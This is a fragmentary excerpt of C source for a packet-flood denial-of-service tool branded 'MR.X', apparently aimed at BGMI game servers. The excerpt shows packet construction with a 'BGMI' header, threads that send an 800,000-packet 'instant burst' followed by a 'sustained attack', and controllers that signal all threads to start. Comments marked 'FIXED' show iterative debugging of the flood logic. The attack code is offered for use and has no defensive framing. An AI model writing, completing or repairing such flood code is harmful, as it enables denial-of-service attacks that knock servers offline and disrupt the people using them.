...
#define INSTANT_BURST_PACKETS 800000
...
int get_warmup_power(int phase) {
    int warmup_levels[] = {100, 200, 300, 400, 500, 600, 700, 800, 900, 1000};
    if (phase >= 0 && phase < 10) {
...
void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed) {
    // ✅ FIXED: Ensure minimum buffer size
    ...
    // ✅ FIXED: Always ensure buffer is at least 20 bytes for header
    int buffer_needed = (dynamic_size > 20) ? dynamic_size : 20;
    memset(buf, 0, buffer_needed);
    
    // ✅ FIXED: Only write header if buffer is large enough
    if (buffer_needed >= 20) {
        buf[0] = 0x42;
        buf[1] = 0x47;
        buf[2] = 0x4D;
...
void *direct_attack(void *arg) {
    ...
    // ✅ FIXED: Wait for controller to signal attack start
    ...
    // ✅ FIXED: Initialize packets_sent array
    unsigned int *packets_sent = calloc(ACTIVE_FLOOD_SOCKETS, sizeof(unsigned int));
    if (!packets_sent) {
        for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
...
void *attack_thread(void *arg) {
    ...
    // ✅ FIXED: Wait for controller signal
    while (!atomic_load(&should_attack) && !atomic_load(&stop_signal)) {
        usleep(1000);
    }
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (power_level >= 100) {
            ...
            divisor = 1;  // Warm-up में 100% से कम power के लिए
        }
...
void *warmup_controller(void *arg) {
    printf("⚡ MR.X WARM-UP SYSTEM ACTIVATED ⚡\n");
    printf("📈 Warming up network stack...\n");
    
    // Simple socket creation to warm up network stack
...
void *attack_controller(void *arg) {
    ...
    printf("🚀 Starting INSTANT BURST: 800K packets in 1 second...\n");
    ...
    // ✅ FIXED: Signal ALL threads to start attack
    atomic_store(&should_attack, 1);
    printf("✅ Instant burst complete! (800K packets)\n");
    printf("🔥 Starting sustained attack...\n");
